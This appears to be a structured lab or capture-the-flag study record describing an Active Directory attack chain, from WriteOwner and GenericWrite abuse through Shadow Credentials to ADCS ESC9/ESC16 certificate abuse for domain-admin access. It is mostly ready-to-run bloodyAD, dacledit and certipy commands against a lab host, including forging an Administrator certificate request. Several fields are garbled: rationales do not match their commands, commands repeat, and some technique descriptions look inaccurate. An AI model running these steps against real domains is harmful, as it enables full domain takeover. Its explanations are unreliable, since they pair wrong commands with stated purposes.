title: Shadow Credential Relay
description: WriteOwner → Shadow Credentials → ADCS ESC9/ESC16. Advanced AD permission abuse with certificate attacks.
introduction: Teaches advanced AD: permission abuse (WriteOwner, GenericWrite) enables Shadow Credentials and ADCS exploitation. ESC9/ESC16 turn low-priv into domain admin via certificate abuse.
mental_model: AD permissions are the key: WriteOwner lets you grant yourself GenericWrite. Shadow Credentials + ESC9 = DA cert. NTLM relay + dacledit = ESC16. Chain permission → cert → auth.
key_principles: WriteOwner on group lets you add yourself; then grant GenericWrite to target
pywhisker adds msDS-KeyCredentialLink; certipy shadow auto exploits ESC9
certipy auth -pfx converts certificate to NTLM hash for PtH
dacledit adds WriteDacl; ESC16 abuses vulnerable CA template ACL
Responder captures NTLMv2 when SMB/LLMNR triggers; relay to LDAP

vulnerabilities.summary: ADCS ESC9 via Shadow Credentials on ca_operator

commands.rationale: Why: Abuse Shadow Credentials for ESC9 DA certificate

privesc.technique: WriteOwner management group → GenericWrite ca_operator → Shadow Credentials → certipy ESC9
commands: bloodyAD -d domain.local -u judith -p '<password>' --host 10.10.11.42 set owner 'CN=management,OU=Groups' judith --domain domain.local
bloodyAD -d domain.local -u judith -p '<password>' --host 10.10.11.42 add genericwrite ca_operator judith

commands.rationale: Why: Add Shadow Credentials so certipy can request DA cert

commands: bloodyAD -d domain.local -u judith -p '<password>' --host 10.10.11.42 set owner 'CN=management,OU=Groups' judith

alternatives.description: ESC9 — abuse Shadow Credentials for cert

commands.cmd: dacledit -d domain.local -u svc_fluffy -p '<password>' --host 10.10.11.42 --add --target 'CN=DC01,OU=Domain Controllers' --principal svc_fluffy --rights WriteDacl
commands.rationale: Why: WriteDacl on DC enables ESC16 cert request for DA

privesc.technique: dacledit → ADCS ESC16 (Vulnerable CA ACL) → DA cert
commands: certipy req -u svc_fluffy@domain.local -hashes :<ntlm_hash> -ca domain-CA -template ESC16 -upn Administrator@domain.local

alternatives.description: Add WriteDacl via relay or direct
commands: dacledit -d domain.local -u svc_fluffy -p '<password>' --host 10.10.11.42 --add --target 'CN=DC01,OU=Domain Controllers' --principal svc_fluffy --rights WriteDacl
